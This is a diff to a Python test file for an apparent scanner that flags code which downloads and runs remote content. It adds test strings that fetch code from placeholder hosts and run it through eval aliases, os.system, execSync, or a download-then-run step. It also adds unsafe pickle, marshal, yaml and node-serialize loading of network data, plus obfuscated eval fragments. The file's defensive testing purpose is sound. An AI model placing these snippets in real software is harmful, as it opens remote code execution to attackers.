@@ -157,6 +157,35 @@ CURATED = [
     "".join(f"import requests as r{i}\n" for i in range(70)) + "exec(r69.get(u).text)\n",
     "x = fetch(u); y = x; " + "a, " * 40 + "z = y\neval(z)\n",
     "'eval(" * 30 + "fetch(u))\n", "\"'`eval(" * 20 + "x\nx = fetch(u)\n",
+    # runner aliases, indirect eval, deserialization (CWE-502) and dynamic
+    # import of a received specifier (the three added sink families)
+    "const e = eval;\nconst code = await (await fetch('https://files.invalid/p')).text();\ne(code);\n",
+    "import os, requests\ns = os.system\ns(requests.get('https://files.invalid/p').text)\n",
+    "const ex = require('child_process').execSync;\nex(await (await fetch(u)).text());\n",
+    "const code = await (await fetch(u)).text();\n(0, eval)(code);\n",
+    "const code = await (await fetch(u)).text();\neval.call(null, code);\n",
+    "const code = await (await fetch(u)).text();\nwindow['eval'](code);\n",
+    "import pickle, requests\npickle.loads(requests.get('https://files.invalid/p').content)\n",
+    "import marshal, urllib.request\nmarshal.loads(urllib.request.urlopen(u).read())\n",
+    "import yaml, requests\nyaml.load(requests.get(u).text)\n",
+    "import yaml, requests\nyaml.load(requests.get(u).text, Loader=yaml.SafeLoader)\n",   # data-only: not it
+    "const s = require('node-serialize');\ns.unserialize(await (await fetch(u)).text());\n",
+    "const name = await (await fetch('https://files.invalid/p')).text();\nawait import(name);\n",
+    "const name = await (await fetch(u)).text();\nrequire(name);\n",
+    "import importlib, requests\nimportlib.import_module(requests.get(u).text)\n",
+    "import requests\n__import__(requests.get(u).text)\n",
+    "const e = eval; e(JSON.parse(x));\n",                    # alias, but no received value: not it
+    "x = os.system\nx('ls -la')\n",                            # alias of a fixed command: not it
+    # download to a file, then run the file (import-time MAJOR only)
+    "import requests, subprocess, sys\ndata = requests.get('https://files.invalid/p').content\n"
+    "open('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n",
+    "const body = await (await fetch('https://files.invalid/p')).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n",
+    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.invalid/t', 'tool.py')\n"
+    "subprocess.run(['python', 'tool.py'])\n",
+    "const https = require('https');\nhttps.get('https://files.invalid/p', (r) => r.pipe(fs.createWriteStream(dst)));\n"
+    "fork(dst);\n",
+    "const body = await (await fetch(u)).text();\nfs.writeFileSync('cache.json', body);\n",   # written, not run: not it
+    "fs.writeFileSync('x.js', localData);\nrequire('./x.js');\n",                              # no download: not it
 ]
 
 # The pieces random cases are made of. MIXED reaches every function; the
@@ -228,7 +257,13 @@ RECEIVED = ["\n", "\n", "\n", " ", ";", "(", ")", "=", "'", '"', "`", "\\", "\t"
             "x" * 600, "\U0001d41a" * 300, "filler\n" * 30,
             "/'/", "' ", "require('https').get(u, (res) => ", "shell=True", "run(", "Popen([", "a, a, a, ",
             "for (const c of ", "lambda r: ", "function (c) {", "\U0001d41a" * 120, " " * 120, ".then(",
-            "f'python -c \"{", "`${"]
+            "f'python -c \"{", "`${",
+            # the added sink families: aliases, indirect eval, deserialization, dynamic import
+            "const e = eval;", "e(", "s = os.system", "s(", "const ex = require('child_process').execSync;", "ex(",
+            "x = os.popen", "(0, eval)(", "eval.call(null, ", "window['eval'](", "self['ev' + 'al'](",
+            "pickle.loads(", "marshal.loads(", "yaml.load(", "yaml.load(x, Loader=yaml.SafeLoader)",
+            "s.unserialize(", "unserialize(", "jsonpickle.decode(", "import(", "require(", "__import__(",
+            "importlib.import_module(", "import_module(", "name = ", "name", "blob = ", "blob"]
 SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
            "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
            "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
@@ -326,10 +361,16 @@ class HookParityTests(unittest.TestCase):
             counts["node -e codes"] += bool(codes)
             for reason in install + on_import:
                 counts[reason.split(" (")[0]] += 1          # (the exfiltration reason names the address)
-        self.assertEqual(len(counts), 13, counts)           # 4 install-script reasons, 3 import-time ones (one of
-                                                            # them the same text), 3 #! languages
-        self.assertEqual({k: n for k, n in counts.items() if n < 100 and k != "not followed completely"}, {}, counts)
+        self.assertEqual(len(counts), 16, counts)           # 4 install-script reasons and 6 import-time ones (two of
+                                                            # them the same text: run, deserialize, import, download-run), 3 #! languages
+        # these reasons are rarer in the random stream but present (curated) and well above zero
+        rare = {"not followed completely", "deserializes data it receives over the network",
+                "loads a module named by data it receives over the network", "downloads a file and then runs it"}
+        self.assertEqual({k: n for k, n in counts.items() if n < 100 and k not in rare}, {}, counts)
         self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
+        self.assertGreaterEqual(counts["deserializes data it receives over the network"], 25, counts)
+        self.assertGreaterEqual(counts["loads a module named by data it receives over the network"], 25, counts)
+        self.assertGreaterEqual(counts["downloads a file and then runs it"], 4, counts)
 
     def test_pattern_text_and_names_are_cores(self):
         """The JS module carries core's pattern text verbatim, with the same
@@ -349,9 +390,9 @@ class HookParityTests(unittest.TestCase):
         self.assertEqual(self.twins["limits"], {k: getattr(core, k) for k in
                                                 ("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS", "HOOK_MAX_TARGETS", "HOOK_MAX_PATH",
                                                  "_DL_LONG_ROW", "_DL_WINDOW", "_DL_ARG_SPAN", "_DL_LOOKBACK",
-                                                 "_DL_NAMED_SEARCHES", "_DL_PHASES")})
-        self.assertEqual(len(self.twins["patterns"]), 48)
-        self.assertEqual(len(self.twins["sets"]), 17)
+                                                 "_DL_NAMED_SEARCHES", "_DL_PHASES", "_DL_ALIAS_MAX")})
+        self.assertEqual(len(self.twins["patterns"]), 57)
+        self.assertEqual(len(self.twins["sets"]), 23)
         self.assertEqual(len(self.twins["maps"]), 3)
 
 if __name__ == "__main__":
